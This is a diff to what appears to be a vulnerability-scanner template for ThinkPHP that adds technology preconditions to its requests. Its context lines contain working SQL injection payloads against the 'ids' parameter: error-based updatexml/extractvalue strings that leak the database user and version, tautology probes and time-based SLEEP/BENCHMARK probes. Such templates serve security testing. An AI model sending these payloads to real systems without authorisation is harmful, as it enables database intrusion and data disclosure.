@@ -18,6 +18,7 @@ requests:
   - method: GET
     preconditions:
       methods: [GET]
+      requires_tech: [thinkphp]
     path:
       - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
       - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,version()),0)]=1"
@@ -33,6 +34,7 @@ requests:
   - method: GET
     preconditions:
       methods: [GET]
+      requires_tech: [thinkphp]
     path:
       - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
       - "{{BaseURL}}/index.php?ids[0,extractvalue(1,concat(0xa,user()))]=1"
@@ -50,6 +52,7 @@ requests:
   - method: GET
     preconditions:
       methods: [GET]
+      requires_tech: [thinkphp]
     path:
       - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,version()),0)]=1"
     matchers-condition: and
@@ -71,6 +74,7 @@ requests:
   - method: GET
     preconditions:
       methods: [GET]
+      requires_tech: [thinkphp]
     path:
       - "{{BaseURL}}/index.php?ids[' OR '1'='1']=1"
       - "{{BaseURL}}/index.php?ids[1 AND 1=1]=1"
@@ -89,6 +93,7 @@ requests:
   - method: GET
     preconditions:
       methods: [GET]
+      requires_tech: [thinkphp]
     path:
       - "{{BaseURL}}/index.php?ids[SLEEP(3)]=1"
       - "{{BaseURL}}/index.php?ids[BENCHMARK(5000000,SHA1('test'))]=1"
